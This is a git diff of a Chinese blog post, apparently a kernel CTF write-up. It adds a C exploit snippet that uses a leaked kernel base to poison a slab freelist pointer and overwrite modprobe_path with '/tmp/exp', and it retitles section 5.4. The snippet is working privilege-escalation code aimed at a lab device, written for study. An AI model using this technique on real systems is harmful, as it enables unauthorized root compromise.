@@ -9,7 +9,7 @@ comments: true
 
 
 - [5.3  kaslr + randomized freelist](#53--kaslr--randomized-freelist)
-- [5.4](#54)
+- [5.4 kaslr + randomized freelist + HARDENED freelist](#54-kaslr--randomized-freelist--hardened-freelist)
 - [5.5](#55)
 - [5.6](#56)
 - [5.7](#57)
@@ -47,9 +47,43 @@ oops脚本:<br>
     int fd3 = open_device();
 ```
 第二步，根据泄露的地址进行漏洞利用，利用方法为修改slab中的`next_ptr`指向`modprobe_path`，并修改`modprobe_path`的内容。<br>
+```c
+    environ_set();
+    //step 0: get kernel_base_addr: via Oops
+    unsigned long long kernel_base_addr = 0;
+    scanf("%llx",&kernel_base_addr);
+    kernel_base_addr = kernel_base_addr - 0x58c20;
+    printf("kernel_addr: %llx\n",kernel_base_addr);
+    unsigned long long modprobe_addr = kernel_base_addr+0x13f4c0-0x100;
+    printf("modprobe_path addr: %llx\n",modprobe_addr);
 
+    //get kernel_base_addr: via Oops
+    int fd = open_device();
+    char buf[1048];
+    // step 1: free the chunk -> freelist
+    printf("step1\n");
+    free_slot(fd,buf,0);
+    // step 2: set next_ptr -> modprobe addr
+    printf("step2\n");
+    for(int i=0;i<=29;i++){
+        memcpy(buf+8*i,(char *)&modprobe_addr,8);
+    }
+    write_slot(fd,buf,0x8*30);
+    // step 3: alloc the buf
+    printf("step3\n");
+    int fd2 = open_device(); // fd2.buf = fd.buf
+    // step 4: write modprobe_path
+    printf("step4\n");
+    int fd3 = open_device();
+    memset(buf,0,0x100);
+    memcpy(buf+0x100,"/tmp/exp\x00",10);
+    write_slot(fd3,buf,0x100+10);
 
-## 5.4<br>
+    get_flag();
+```
+这里有一个坑点，需要注意`modprobe_path`+0x100的位置为`kmod_concurrent_max`,这个结构体不能随意修改。<br>
+
+## 5.4 kaslr + randomized freelist + HARDENED freelist<br>
 
 ## 5.5<br>
 
